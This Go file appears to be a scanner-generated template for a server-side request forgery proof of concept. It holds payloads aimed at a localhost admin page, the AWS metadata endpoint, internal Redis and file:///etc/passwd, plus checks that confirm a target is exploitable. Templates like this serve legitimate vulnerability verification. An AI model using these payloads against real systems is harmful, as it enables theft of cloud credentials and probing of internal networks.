package main

/*
PoC Template: Server-Side Request Forgery (SSRF)
Auto-generated from ZeroKit finding

Vulnerability: {{CATEGORY}}
Location: {{FILE}}:{{LINE}}
*/

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

func main() {
	fmt.Println("==================================================")
	fmt.Println("🎯 PoC: Server-Side Request Forgery (SSRF)")
	fmt.Println("Location: {{FILE}}:{{LINE}}")
	fmt.Println("==================================================")
	fmt.Println()

	// =====================================================
	// EXPLOIT PAYLOADS
	// =====================================================
	payloadLocalhost := "http://localhost:8080/admin"
	payloadMetadata := "http://169.254.169.254/latest/meta-data/"  // AWS metadata
	payloadInternal := "http://127.0.0.1:6379"  // Redis
	payloadFile := "file:///etc/passwd"

	fmt.Printf("[*] Testing SSRF payload: %s\n", payloadLocalhost)

	// =====================================================
	// VULNERABLE CODE EXECUTION
	// =====================================================
	{{VULNERABLE_CODE}}

	// =====================================================
	// VERIFICATION
	// =====================================================
	success := false

	// Check for internal service responses
	if strings.Contains(output, "admin") || strings.Contains(output, "dashboard") {
		fmt.Println("✅ VULNERABILITY CONFIRMED: Internal admin endpoint accessed")
		success = true
	}

	// Check for AWS metadata
	matched, _ := regexp.MatchString(`(ami-id|instance-id|iam/)`, output)
	if matched {
		fmt.Println("✅ VULNERABILITY CONFIRMED: Cloud metadata endpoint accessed")
		success = true
	}

	// Check for Redis/database responses
	if strings.Contains(output, "PONG") || strings.Contains(output, "redis_version") {
		fmt.Println("✅ VULNERABILITY CONFIRMED: Internal Redis accessed")
		success = true
	}

	// Check for file protocol
	matched, _ = regexp.MatchString(`root:.*:0:0:`, output)
	if matched {
		fmt.Println("✅ VULNERABILITY CONFIRMED: File protocol SSRF")
		success = true
	}

	// Check for connection errors (indicates request was made)
	if strings.Contains(output, "connection refused") || strings.Contains(output, "timeout") {
		fmt.Println("⚠️  SSRF attempted - connection to internal service")
		fmt.Println("    Still vulnerable - URL validation bypassed")
		success = true
	}

	// =====================================================
	// RESULT
	// =====================================================
	fmt.Println()
	fmt.Println("==================================================")
	if success {
		fmt.Println("🚨 RESULT: EXPLOITABLE (SSRF)")
		fmt.Println("Severity: {{SEVERITY}}")
		fmt.Println("Impact: Internal network scanning, cloud metadata theft")
		os.Exit(0)
	} else {
		fmt.Println("❌ RESULT: NOT EXPLOITABLE")
		fmt.Println("URL validation or IP filtering present")
		os.Exit(1)
	}
}
